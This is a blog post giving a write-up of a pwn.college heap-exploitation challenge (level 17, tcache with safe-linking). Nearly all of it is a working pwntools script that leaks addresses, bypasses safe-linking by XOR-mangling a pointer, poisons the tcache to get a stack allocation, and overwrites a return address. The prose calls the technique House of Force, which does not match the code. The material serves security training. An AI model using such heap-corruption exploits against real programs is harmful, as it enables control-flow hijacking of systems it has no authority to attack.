---
layout: post
title: (Dynamic Allocator Misuse) level 17
categories: pwn.college Dynamic-Allocator-Misuse
date: 2025-10-13 08:10:27 +0300
tags: pwn.college PIE ASLR heap house-of-force tecache metadata house-of-spirit safe-linking 
---
## Information
- category: pwn


## Description 
> Revisit a prior challenge, now with TCACHE safe-linking.

## Write-up
 House of Force to pivot `malloc` into the stack, and a compact XOR-index → stack pivot trick. Each section is a minimal.

## Exploit
 ```python
from pwn import *

elf = context.binary = ELF("/challenge/babyheap_level17.1")
global p
p = elf.process()

def malloc(idx,size):
    p.sendline(b"malloc")
    p.sendline(idx)
    p.sendline(size)

def free(idx):
    p.sendline(b"free")
    p.sendline(idx)

def scanf(idx,data):
    p.sendline(b"scanf")
    p.sendline(idx)
    p.sendline(data)

def puts(idx):
    p.sendline(b"puts")
    p.sendline(idx)

def quit():
    p.sendline(b"quit")

def exploit():
    p.recvuntil(b"of your allocations is at: ")
    stack = int(p.recvline().strip().split(b".")[0],16)
    log.success(f"stack: {hex(stack)}")

    p.recvuntil(b"main is at: ")
    main = int(p.recvline().strip().split(b".")[0],16)
    log.success(f"main: {hex(main)}")

    malloc(b"0",b"0")
    malloc(b"1",b"0")

    free(b"1")
    free(b"0")

    puts(b"1")

    p.recvuntil(b"Data: ")
    pos = u64(p.recvline().strip().ljust(8,b"\x00"))
    log.success(f"pos: {hex(pos)}")
    
    puts(b"0")

    mangled_ret = pos ^ stack

    scanf(b"0",flat(mangled_ret))

    malloc(b"0",b"0")
    malloc(b"0",b"0")

    scanf(b"0",p64(stack) + p64(stack + 296))

    scanf(b"1",p64(main - 0x151b + 0x1400))

    quit()

    p.interactive()

def main():
    exploit() 

if __name__ == "__main__":
    main()
 ```
